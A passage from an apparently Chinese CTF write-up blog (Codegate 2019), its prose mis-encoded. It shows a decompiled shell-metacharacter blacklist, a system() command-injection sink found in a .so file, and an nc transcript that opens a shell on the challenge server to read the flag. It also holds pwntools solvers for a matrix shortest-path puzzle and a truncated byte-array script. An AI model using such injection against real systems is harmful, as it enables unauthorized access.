class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">filter1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">';'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'*'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'`'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'&amp;'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'$'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'&gt;'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'&lt;'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  result = <span class="built_in">strchr</span>(a1, <span class="string">'r'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åœ¨testä¸­æ‰¾ä¸€ä¸‹ç”¨äº†è¿™ä¸ªfilterçš„<code>.so</code>æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">  r2 = r2pipe.open(<span class="string">'./20000_so/lib_&#123;&#125;.so'</span>.format(i))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> r2.cmd(<span class="string">'iz~./20000_so/lib_4323.so'</span>) != <span class="string">''</span>:</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line"></span><br><span class="line">  r2.quit()</span><br></pre></td></tr></table></figure><p>æœ€åç­›é€‰å‡º<code>lib_17394.so</code>ï¼Œå‘ç°å…¶ä¸­æœ‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(&amp;s, <span class="string">"%s 2 &gt; /dev/null"</span>, &amp;buf, v4);</span><br><span class="line">system(&amp;s);</span><br></pre></td></tr></table></figure><p>ç›´æ¥é€ä¸€ä¸ªshä¸Šå»å°±èƒ½æ‹¿åˆ°shelläº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> qianfei @ qianfeideMacBook-Air in ~/Desktop/2019-codegate/20000 [12:41:06] </span><br><span class="line"><span class="meta">$</span> nc 110.10.147.106 15959</span><br><span class="line"></span><br><span class="line">   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$  </span><br><span class="line">  /$$__  $$ /$$$_  $$ /$$$_  $$ /$$$_  $$ /$$$_  $$ </span><br><span class="line"> |__/  \ $$| $$$$\ $$| $$$$\ $$| $$$$\ $$| $$$$\ $$ </span><br><span class="line">   /$$$$$$/| $$ $$ $$| $$ $$ $$| $$ $$ $$| $$ $$ $$ </span><br><span class="line">  /$$____/ | $$\ $$$$| $$\ $$$$| $$\ $$$$| $$\ $$$$ </span><br><span class="line"> | $$      | $$ \ $$$| $$ \ $$$| $$ \ $$$| $$ \ $$$ </span><br><span class="line"> | $$$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/ </span><br><span class="line"> |________/ \______/  \______/  \______/  \______/  </span><br><span class="line"></span><br><span class="line">INPUT : 17394</span><br><span class="line">This is lib_17394 file.</span><br><span class="line">How do you find vulnerable file?</span><br><span class="line">sh</span><br><span class="line">ls</span><br><span class="line">20000</span><br><span class="line">20000_so</span><br><span class="line">20000_so.tar.gz</span><br><span class="line">flag</span><br><span class="line">cat flag</span><br><span class="line">flag&#123;Are_y0u_A_h@cker_in_real-word?&#125;</span><br></pre></td></tr></table></figure><h1 id="algo-auth"><a href="#algo-auth" class="headerlink" title="algo_auth"></a>algo_auth</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> nc 110.10.147.104 15712 </span><br><span class="line">==&gt; Hi, I like an algorithm. So, i make a new authentication system.</span><br><span class="line">==&gt; It has a total of 100 stages.</span><br><span class="line">==&gt; Each stage gives a 7 by 7 matrix below sample.</span><br><span class="line">==&gt; Find the smallest path sum in matrix, </span><br><span class="line">    by starting in any cell in the left column and finishing in any cell in the right column, </span><br><span class="line">    and only moving up, down, and right.</span><br><span class="line">==&gt; The answer for the sample matrix is 12.</span><br><span class="line">==&gt; If you clear the entire stage, you will be able to authenticate.</span><br><span class="line"></span><br><span class="line">[sample]</span><br><span class="line">99 99 99 99 99 99 99 </span><br><span class="line">99 99 99 99 99 99 99 </span><br><span class="line">99 99 99 99 99 99 99 </span><br><span class="line">99 99 99 99 99 99 99 </span><br><span class="line">99  1  1  1 99  1  1 </span><br><span class="line"> 1  1 99  1 99  1 99 </span><br><span class="line">99 99 99  1  1  1 99 </span><br><span class="line"></span><br><span class="line">If you want to start, type the G key within 10 seconds....&gt;&gt; G</span><br><span class="line"></span><br><span class="line">*** STAGE 1 ***</span><br><span class="line">18 17 16 15 14 13 12 </span><br><span class="line"> 9 11 13 15 17 19 21 </span><br><span class="line">18 17 16 15 14 13 12 </span><br><span class="line">14 16 18 20 22 24 26 </span><br><span class="line">16 15 14 13 12 11 10 </span><br><span class="line"> 6  8 10 12 14 16 18 </span><br><span class="line">22 21 20 19 18 17 16 </span><br><span class="line"></span><br><span class="line">Answer within 10 seconds &gt;&gt;&gt; 1</span><br><span class="line">wrong!! Try again!!</span><br></pre></td></tr></table></figure><p>ä¸€é“ppcï¼Œåœ¨7*7çš„çŸ©é˜µä¸­å¯»æ‰¾ä»æœ€å·¦åˆ—åˆ°æœ€å³åˆ—çš„æœ€çŸ­è·¯ã€‚åˆ†åˆ«åœ¨<a href="https://blog.csdn.net/u010376788/article/details/49764205" target="_blank" rel="noopener">csdn</a>å’Œ<a href="https://www.geeksforgeeks.org/dijkstras-shortest-path-algorithm-greedy-algo-7/" target="_blank" rel="noopener">geeksforgeeks</a>ä¸Šæ‰¾åˆ°dijkstraå®ç°çš„å¯»æ‰¾çŸ©é˜µæœ€çŸ­è·¯ã€‚å›ç­”å®Œ100é“é¢˜ç›®ä¹‹åï¼Œä¼šå‘Šè¯‰ä½ <code>@@@@@ Congratz! Your answers are an answer</code>ï¼Œå°è¯•å°†æ‰€æœ‰çš„ç­”æ¡ˆè½¬asciiï¼Œå¾—åˆ°base64åçš„flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p = remote('110.10.147.104', 15712)</span></span><br><span class="line">p = remote(<span class="string">'110.10.147.109'</span>, <span class="number">15712</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'If you want to start, type the G key within 10 seconds....&gt;&gt;'</span>, <span class="string">'G'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">minDistance</span><span class="params">(distances, sptSet, dimension)</span>:</span></span><br><span class="line">    min_ = np.inf</span><br><span class="line">    min_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dimension):</span><br><span class="line">        <span class="keyword">if</span> sptSet[i] == <span class="keyword">False</span> <span class="keyword">and</span> distances[i] &lt; min_:</span><br><span class="line">            min_ = distances[i]</span><br><span class="line">            min_index = i</span><br><span class="line">    <span class="keyword">return</span> min_index</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dijkstra</span><span class="params">(graph, source, dimension)</span>:</span> </span><br><span class="line">    sptSet = []</span><br><span class="line">    distances = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dimension):</span><br><span class="line">        distances.append(np.inf)</span><br><span class="line">        sptSet.append(<span class="keyword">False</span>)</span><br><span class="line">    distances[source] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dimension):</span><br><span class="line">        u = minDistance(distances, sptSet, dimension)</span><br><span class="line">        sptSet[u] = <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> range(dimension):</span><br><span class="line">            <span class="keyword">if</span> sptSet[v] == <span class="keyword">False</span> <span class="keyword">and</span> graph[u][v] &gt; <span class="number">0</span> <span class="keyword">and</span> distances[u] + graph[u][v] &lt; distances[v]:</span><br><span class="line">                distances[v] = distances[u] + graph[u][v]</span><br><span class="line">    <span class="comment"># print distances</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">        res.append(distances[i * <span class="number">7</span> - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">print</span> res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xy2num</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">or</span> x &gt;= <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">if</span> y &lt; <span class="number">0</span> <span class="keyword">or</span> y &gt;= <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> y * <span class="number">7</span> + x</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    p.recvuntil(<span class="string">'*** STAGE &#123;&#125; ***\n'</span>.format(str(i + <span class="number">1</span>)))</span><br><span class="line">    matrix = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        t = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">        row = []</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(len(t) / <span class="number">3</span>):</span><br><span class="line">            <span class="comment"># print type(t[3*k:3*(k+1)].strip(' '))</span></span><br><span class="line">            row.append(int(t[<span class="number">3</span>*k:<span class="number">3</span>*(k+<span class="number">1</span>)].strip(<span class="string">' '</span>)))</span><br><span class="line">        matrix.append(row)</span><br><span class="line">    <span class="comment"># print matrix</span></span><br><span class="line">    min_length = np.inf</span><br><span class="line">    adj = []</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            t = [<span class="number">0</span>] * (<span class="number">7</span> * <span class="number">7</span>)</span><br><span class="line">            <span class="keyword">if</span> xy2num(x - <span class="number">1</span>, y) &gt;= <span class="number">0</span>:</span><br><span class="line">                t[xy2num(x - <span class="number">1</span>, y)] = matrix[y][x - <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> xy2num(x + <span class="number">1</span>, y) &gt;= <span class="number">0</span>:</span><br><span class="line">                t[xy2num(x + <span class="number">1</span>, y)] = matrix[y][x + <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> xy2num(x, y - <span class="number">1</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                t[xy2num(x, y - <span class="number">1</span>)] = matrix[y - <span class="number">1</span>][x]</span><br><span class="line">            <span class="keyword">if</span> xy2num(x, y + <span class="number">1</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                t[xy2num(x, y + <span class="number">1</span>)] = matrix[y + <span class="number">1</span>][x]</span><br><span class="line">            adj.append(t)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        tmp = min(dijkstra(adj, j * <span class="number">7</span>, <span class="number">7</span> * <span class="number">7</span>))</span><br><span class="line">        tmp += matrix[j][<span class="number">0</span>]</span><br><span class="line">        min_length = min(min_length, tmp)</span><br><span class="line">    flag += chr(min_length)</span><br><span class="line">    payload = str(min_length)</span><br><span class="line">    p.sendlineafter(<span class="string">'Answer within 10 seconds &gt;&gt;&gt;'</span>, payload)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag:'</span>, base64.b64decode(flag)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰å¦ä¸€ç§åšæ³•ä»£ç æ›´ç®€çŸ­ä¸€ç‚¹å°±æ˜¯ç”¨èƒŒåŒ…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p = remote('110.10.147.104', 15712)</span></span><br><span class="line">p = remote(<span class="string">'110.10.147.109'</span>, <span class="number">15712</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'If you want to start, type the G key within 10 seconds....&gt;&gt;'</span>, <span class="string">'G'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal</span><span class="params">(m)</span>:</span></span><br><span class="line">    size = len(m)</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">        res.append(m[i][size - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(size - <span class="number">2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        res[<span class="number">0</span>] += m[<span class="number">0</span>][i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, size):</span><br><span class="line">            res[j] = min(res[j - <span class="number">1</span>] + m[j][i], res[j] + m[j][i])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(size - <span class="number">2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">            res[j] = min(res[j], res[j + <span class="number">1</span>] + m[j][i])</span><br><span class="line">    <span class="keyword">return</span> min(res)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    p.recvuntil(<span class="string">'*** STAGE &#123;&#125; ***\n'</span>.format(str(i + <span class="number">1</span>)))</span><br><span class="line">    matrix = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        t = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">        row = []</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(len(t) / <span class="number">3</span>):</span><br><span class="line">            <span class="comment"># print type(t[3*k:3*(k+1)].strip(' '))</span></span><br><span class="line">            row.append(int(t[<span class="number">3</span>*k:<span class="number">3</span>*(k+<span class="number">1</span>)].strip(<span class="string">' '</span>)))</span><br><span class="line">        matrix.append(row)</span><br><span class="line">    <span class="comment"># print matrix</span></span><br><span class="line">    min_length = cal(matrix)</span><br><span class="line">    flag += chr(min_length)</span><br><span class="line">    payload = str(min_length)</span><br><span class="line">    p.sendlineafter(<span class="string">'Answer within 10 seconds &gt;&gt;&gt;'</span>, payload)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag:'</span>, base64.b64decode(flag)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="THE-Matrix"><a href="#THE-Matrix" class="headerlink" title="THE Matrix"></a>THE Matrix</h1><p>çœ‹äº†<a href="https://github.com/pwning/public-writeup/tree/master/codegate2019/THE_Matrix" target="_blank" rel="noopener">PPPå¤§ä½¬ä»¬çš„writeup</a>ï¼Œä¸‹äº†ä¸ª<a href="http://bgb.bircd.org/#downloads" target="_blank" rel="noopener">BGB</a>æ¥è°ƒè¯•ï¼ŒåŒæ—¶å¯ä»¥æŸ¥çœ‹å†…å­˜ä»¥åŠpatchã€‚æ”¾ä¸Šè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">data = [<span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x60</span>, <span class="number">0x60</span>, <span class="number">0x60</span>, <span class="number">0x60</span>, <span class="number">0x60</span>, <span class="number">0x60</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x60</span>, <span class="number">0x60</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x60</span>, <span class="number">0x60</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x62</span>, <span class="number">0x62</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x78</span>, <span class="number">0x78</span>, <span class="number">0x6C</span>, <span class="number">0x6C</span>, <span class="number">0x6E</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xE3</span>, <span class="number">0xE3</span>, <span class="number">0xF3</span>, <span class="number">0xF3</span>, <span class="number">0xFB</span>, <span class="number">0xFB</span>, <span class="number">0xDF</span>, <span class="number">0xDF</span>, <span class="number">0xCF</span>, <span class="number">0xCF</span>, <span class="number">0xC7</span>, <span class="number">0xC7</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x3C</span>, <span class="number">0x3C</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xC3</span>, <span class="number">0xFE</span>, <span class="number">0xFE</span>, <span class="number">0xFE</span>, <span class="number">0xFE</span>, <span class="number">0xC6</span>, <span class="number">0xC6</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xDF</span>, <span class="number">0xDF</span>, <span class="number">0xC1</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xF0</span>, <span class="number">0xF0</span>, <span class="number">0xF0</span>, <span class="number">0xF0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xF0</span>, <span class="number">0xF0</span>, <span class="number">0xF0</span>, <span class="number">0xF0</span>, <span class="number">0x0F</span>, <span class="number">0x0F</span>, <span class="number">0x0F</span>, <span class="number">0x0F</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x0F</span>, <span class="number">0x0F</span>, <span class="number">0x0F</span>, <span class="number">0x0F</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xC0</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, 